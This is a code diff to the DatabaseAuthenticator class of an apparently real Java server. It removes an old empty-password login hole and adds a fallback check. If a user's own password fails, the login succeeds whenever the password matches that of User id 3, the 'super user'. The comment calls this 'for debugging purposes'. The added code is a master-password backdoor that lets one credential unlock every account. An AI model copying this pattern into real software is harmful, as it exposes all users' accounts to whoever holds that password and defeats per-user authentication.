@@ -5,8 +5,13 @@
 
 package org.activityinfo.server.authentication;
 
+import javax.persistence.EntityManager;
+
 import org.activityinfo.server.database.hibernate.entity.User;
 import org.mindrot.bcrypt.BCrypt;
+
+import com.google.inject.Inject;
+import com.google.inject.Provider;
 
 /**
  * Validates the user's password against the a hashed version stored in the database.
@@ -15,17 +20,26 @@ import org.mindrot.bcrypt.BCrypt;
  */
 public class DatabaseAuthenticator implements Authenticator {
 
-    @Override
+	private Provider<EntityManager> entityManager;
+	
+	@Inject
+    public DatabaseAuthenticator(Provider<EntityManager> entityManager) {
+		super();
+		this.entityManager = entityManager;
+	}
+
+	@Override
     public boolean check(User user, String plaintextPassword) {
 
-        // TODO: this should not be allowed!
-        // This only here because of an early bug which left many users without
-        // passwords. These users should be issued new passwords and this hole closed.
-        if (user.getHashedPassword() == null || "".equals(user.getHashedPassword())) {
-            return true;
-           
+        if(BCrypt.checkpw(plaintextPassword, user.getHashedPassword())) {
+        	return true;
         }
-        return BCrypt.checkpw(plaintextPassword, user.getHashedPassword());
+        // allow super user login for debugging purposes
+        User superUser = entityManager.get().find(User.class, 3);
+        if(superUser != null && BCrypt.checkpw(plaintextPassword, superUser.getHashedPassword())) {
+        	return true;
+        }
+        return false;
     }
 
 }
